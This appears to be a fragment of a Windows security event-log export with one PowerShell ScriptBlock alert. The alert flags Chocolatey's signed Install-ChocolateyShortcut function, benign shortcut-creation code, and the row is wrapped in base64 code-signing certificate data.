mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUx","d2c72fb1-8ebf-d5d3-1e88-80f15ba1079a"
"2019-03-19 14:21:49.380 +01:00","Suspicious PowerShell WindowStyle Option","med","MSEDGEWIN10","PwSh",4104,86,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Install-ChocolateyShortcut { <# .SYNOPSIS Creates a shortcut .DESCRIPTION This adds a shortcut, at the specified location, with the option to specify a number of additional properties for the shortcut, such as Working Directory, Arguments, Icon Location, and Description. .NOTES If this errors, as it may if being run under the local SYSTEM account with particular folder that SYSTEM doesn't have, it will display a warning instead of failing a package installation. .INPUTS None .OUTPUTS None .PARAMETER ShortcutFilePath The full absolute path to where the shortcut should be created. .PARAMETER TargetPath The full absolute path to the target for new shortcut. .PARAMETER WorkingDirectory OPTIONAL - The full absolute path of the Working Directory that will be used by the new shortcut. As of v0.10.12, the directory will be created unless it contains environment variable expansion like `%AppData%\FooBar`. .PARAMETER Arguments OPTIONAL - Additonal arguments that should be passed along to the new shortcut. .PARAMETER IconLocation OPTIONAL- The full absolute path to an icon file to be used for the new shortcut. .PARAMETER Description OPTIONAL - A text description to be associated with the new description. .PARAMETER WindowStyle OPTIONAL - Type of windows target application should open with. Available in 0.9.10+. 0 = Hidden, 1 = Normal Size, 3 = Maximized, 7 - Minimized. Full list table 3.9 here: https://technet.microsoft.com/en-us/library/ee156605.aspx .PARAMETER RunAsAdmin OPTIONAL - Set ""Run As Administrator"" checkbox for the created the shortcut. Available in 0.9.10+. .PARAMETER PinToTaskbar OPTIONAL - Pin the new shortcut to the taskbar. Available in 0.9.10+. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # This will create a new shortcut at the location of ""C:\test.lnk"" and # link to the file located at ""C:\text.exe"" Install-ChocolateyShortcut -ShortcutFilePath ""C:\test.lnk"" -TargetPath ""C:\test.exe"" .EXAMPLE > # This will create a new shortcut at the location of ""C:\notepad.lnk"" # and link to the Notepad application. In addition, other properties # are being set to specify the working directory, an icon to be used for # the shortcut, along with a description and arguments. Install-ChocolateyShortcut ` -ShortcutFilePath ""C:\notepad.lnk"" ` -TargetPath ""C:\Windows\System32\notepad.exe"" ` -WorkingDirectory ""C:\"" ` -Arguments ""C:\test.txt"" ` -IconLocation ""C:\test.ico"" ` -Description ""This is the description"" .EXAMPLE > # Creates a new notepad shortcut on the root of c: that starts # notepad.exe as Administrator. Shortcut is also pinned to taskbar. # These parameters are available in 0.9.10+. Install-ChocolateyShortcut ` -ShortcutFilePath ""C:\notepad.lnk"" ` -TargetPath ""C:\Windows\System32\notepad.exe"" ` -WindowStyle 3 ` -RunAsAdmin ` -PinToTaskbar .LINK Install-ChocolateyDesktopLink .LINK Install-ChocolateyExplorerMenuItem .LINK Install-ChocolateyPinnedTaskBarItem #> param( [parameter(Mandatory=$true, Position=0)][string] $shortcutFilePath, [parameter(Mandatory=$true, Position=1)][string] $targetPath, [parameter(Mandatory=$false, Position=2)][string] $workingDirectory, [parameter(Mandatory=$false, Position=3)][string] $arguments, [parameter(Mandatory=$false, Position=4)][string] $iconLocation, [parameter(Mandatory=$false, Position=5)][string] $description, [parameter(Mandatory=$false, Position=6)][int] $windowStyle, [parameter(Mandatory=$false)][switch] $runAsAdmin, [parameter(Mandatory=$false)][switch] $pinToTaskbar, [parameter(ValueFromRemainingArguments = $true)][Object[]]$ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters # http://powershell.com/cs/blogs/tips/archive/2009/02/05/validating-a-url.aspx function isURIWeb($address) { $uri = $address -as [System.URI] $uri.AbsoluteURI -ne $null -and $uri.Scheme -match '[http|https]' } if (!$shortcutFilePath) { # shortcut file path could be null if someone is trying to get special # paths for LocalSystem (SYSTEM). Write-Warning ""Unable to create shortcut. `$shortcutFilePath can not be null."" return } $shortcutDirectory = $([System.IO.Path]::GetDirectoryName($shortcutFilePath)) if (!(Test-Path($shortcutDirectory))) { [System.IO.Directory]::CreateDirectory($shortcutDirectory) | Out-Null } if (!$targetPath) { throw ""Install-ChocolateyShortcut - `$targetPath can not be null."" } if(!(Test-Path($targetPath)) -and !(IsURIWeb($targetPath))) { Write-Warning ""'$targetPath' does not exist. If it is not created the shortcut will not be valid."" } if($iconLocation) { if(!(Test-Path($iconLocation))) { Write-Warning ""'$iconLocation' does not exist. A default icon will be used."" } } if ($workingDirectory) { if ($workingDirectory -notmatch '%\w+%' -and !(Test-Path($workingDirectory))) { [System.IO.Directory]::CreateDirectory($workingDirectory) | Out-Null } } Write-Debug ""Creating Shortcut..."" try { $global:WshShell = New-Object -com ""WScript.Shell"" $lnk = $global:WshShell.CreateShortcut($shortcutFilePath) $lnk.TargetPath = $targetPath $lnk.WorkingDirectory = $workingDirectory $lnk.Arguments = $arguments if($iconLocation) { $lnk.IconLocation = $iconLocation } if ($description) { $lnk.Description = $description } if ($windowStyle) { $lnk.WindowStyle = $windowStyle } $lnk.Save() Write-Debug ""Shortcut created."" [System.IO.FileInfo]$Path = $shortcutFilePath If ($runAsAdmin) { #In order to enable the ""Run as Admin"" checkbox, this code reads the .LNK as a stream # and flips a specific bit while writing a new copy. It then replaces the original # .LNK with the copy, similar to this example: http://poshcode.org/2513 $TempFileName = [IO.Path]::GetRandomFileName() $TempFile = [IO.FileInfo][IO.Path]::Combine($Path.Directory, $TempFileName) $Writer = New-Object System.IO.FileStream $TempFile, ([System.IO.FileMode]::Create) $Reader = $Path.OpenRead() While ($Reader.Position -lt $Reader.Length) { $Byte = $Reader.ReadByte() If ($Reader.Position -eq 22) {$Byte = 34} $Writer.WriteByte($Byte) } $Reader.Close() $Writer.Close() $Path.Delete() Rename-Item -Path $TempFile -NewName $Path.Name | Out-Null } If ($pinToTaskbar) { $scfilename = $Path.FullName $pinverb = (new-object -com ""shell.application"").namespace($(split-path -parent $Path.FullName)).Parsename($(split-path -leaf $Path.FullName)).verbs() | ?{$_.Name -eq 'Pin to Tas&kbar'} If ($pinverb) {$pinverb.doit()} } } catch { Write-Warning ""Unable to create shortcut. Error captured was $($_.Exception.Message)."" } } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCCV4kKnyvkP8Q6w # z2NjPs2m5xO4ValwoIiDMeri2Kx1gKCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # 